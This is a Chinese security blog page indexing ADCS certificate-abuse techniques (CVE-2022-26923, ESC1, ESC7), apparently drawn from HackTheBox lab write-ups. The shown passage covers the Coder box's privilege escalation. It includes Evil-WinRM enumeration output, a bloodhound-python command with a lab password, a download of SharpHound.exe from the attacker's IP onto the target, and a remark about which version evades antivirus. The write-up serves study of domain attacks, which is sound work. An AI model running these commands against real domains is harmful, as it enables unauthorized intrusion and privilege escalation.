---
title: ADCS 模板、证书映射与 CA 权限
url: https://lucifer11.xyz/knowledge/adcs/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:42.192903
---

# ADCS 模板、证书映射与 CA 权限

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [dNSHostName 与证书模板状态](#dNSHostName-%E4%B8%8E%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF%E7%8A%B6%E6%80%81)
4. [SQL 服务账户与两种身份路径](#SQL-%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E4%B8%8E%E4%B8%A4%E7%A7%8D%E8%BA%AB%E4%BB%BD%E8%B7%AF%E5%BE%84)
5. [ESC1 与不支持 PKINIT 时的证书认证](#ESC1-%E4%B8%8E%E4%B8%8D%E6%94%AF%E6%8C%81-PKINIT-%E6%97%B6%E7%9A%84%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81)
6. [ManageCA 权限与 ESC7](#ManageCA-%E6%9D%83%E9%99%90%E4%B8%8E-ESC7)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# ADCS 模板、证书映射与 CA 权限

发表于
2026-11-25

分类于

[身份与域安全](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/)
，
[证书服务](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1/)

阅读次数：

本文字数：
20k

阅读时长 ≈
1:12

证书利用要同时核对注册者、模板字段、颁发条件与认证端的身份映射。本章对照 Coder、Authority、Escape 和 Manager，保留 certipy、Certify、Rubeus 与 PassTheCert 的原有输出和分支。

证书利用要同时核对注册者、模板字段、颁发条件与认证端的身份映射。本章对照 Coder、Authority、Escape 和 Manager，保留 certipy、Certify、Rubeus 与 PassTheCert 的原有输出和分支。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/adcs/source.md)
展开全部技术记录

## 分析重点

Coder 的 dNSHostName 与模板状态不同于 Authority 的任意 SAN 条件。

Escape 同时记录证书和 Silver Ticket；Manager 关注 ManageCA 与颁发审批。

PKINIT 不可用、时钟不一致和清理任务恢复对象，都会改变原链下一步是否可执行。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [dNSHostName 与证书模板状态](#case-coder) | coder | ADCS、CVE-2022-26923、BloodHound |
| [SQL 服务账户与两种身份路径](#case-escape) | escape | ADCS、Silver Ticket、MSSQL、NTLM |
| [ESC1 与不支持 PKINIT 时的证书认证](#case-htb-authority) | htb-authority | ADCS、ESC1、Ansible、PassTheCert |
| [ManageCA 权限与 ESC7](#case-htb-manager) | htb-manager | ADCS、ESC7、MSSQL |

## dNSHostName 与证书模板状态

CVE-2022-26923 的预期路径与模板修改的替代路径同时留存。尤其保留 Enrollment Flag、Name Flag 和靶场清理脚本恢复对象后所需的重新配置步骤。

来源 coder · 原记录 2023-12-19 · 33 个代码块 · 18 处图片引用

查看分析过程、攻击步骤与完整代码

#### 简述

本文是insane难度的HTB Coder机器的域渗透部分，其中Bloodhound AD Enumeration, ADCS CVE-2022-26923等域渗透提权细节是此box的特色，主要参考0xdf’s blog coder walkthrough和HTB的coder官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder.png)

#### 直接来到提权部分

通过列出e.black用户所属的组来开始枚举。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ``` | ``` *Evil-WinRM* PS C:\Users\e.black\Documents> whoami /groups  GROUP INFORMATION -----------------  Group Name                                  Type             SID                                            Attributes =========================================== ================ ============================================== ================================================== Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group CODER\PKI Admins                            Group            S-1-5-21-2608251805-3526430372-1546376444-2101 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  *Evil-WinRM* PS C:\Users\e.black\Documents> net group "PKI Admins" Group name     PKI Admins Comment        ADCS Certificate and Template Management  Members  ------------------------------------------------------------------------------- e.black The command completed successfully. ``` |

列出了几个组，其中最值得注意的是PKI Admins，继续枚举它们。

该组织控制着Active Directory Certificate Services (ADCS) 证书，为潜在的ADCS滥用打开了大门。从这里开始，可以继续手动枚举系统，或者尝试使用混淆版本的SharpHound来做大部分的枚举。

#### bloodhound信息收集

通过之前渗透得到的账号密码信息继续使用bloodhound-python进行信息收集

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ``` | ``` ~/hackthebox/machine/coder ⌚ 18:44:17 $ bloodhound-python -c All -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -ns 10.10.11.207 -d coder.htb -dc coder.htb --zip INFO: Found AD domain: coder.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: coder.htb INFO: Kerberos auth to LDAP failed, trying NTLM WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead... INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: coder.htb INFO: Kerberos auth to LDAP failed, trying NTLM WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead... INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 10 users INFO: Found 55 groups INFO: Found 3 gpos INFO: Found 5 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc01.coder.htb INFO: Done in 02M 23S INFO: Compressing output into 20231220185002_bloodhound.zip ``` |

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder1.png)

或SharpHound v1.1.1

* 注意这里SharpHound最新版2.3.0收集到的zip文件，最新版bloodhound 4.3.1解析不了，多次尝试发现只有SharpHound v1.1.1版本不会被杀软kill，而且可以正常收集zip文件，最新版bloodhound 4.3.1也能正常解析

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ``` | ``` *Evil-WinRM* PS C:\Users\e.black\Documents> wget 10.10.16.55/SharpHound.exe -o SharpHound.exe *Evil-WinRM* PS C:\Users\e.black\Documents> ./SharpHound.exe -c ALL 2023-12-20T16:27:11.3045690-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-12-20T16:27:11.5155041-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-12-20T16:27:11.5436318-08:00|INFORMATION|Initializing SharpHound at 4:27 PM on 12/20/2023 2023-12-20T16:27:11.6842528-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for coder.htb : dc01.coder.htb 2023-12-20T16:27:11.9936243-08:00|INFORMATION|Loaded cache with stats: 286 ID to type mappings.  287 name to SID mappings.  1 machine sid mappings.  2 sid to domain mappings.  0 global catalog mappings. 2023-12-20T16:27:12.0076864-08:00|INFORMATION|...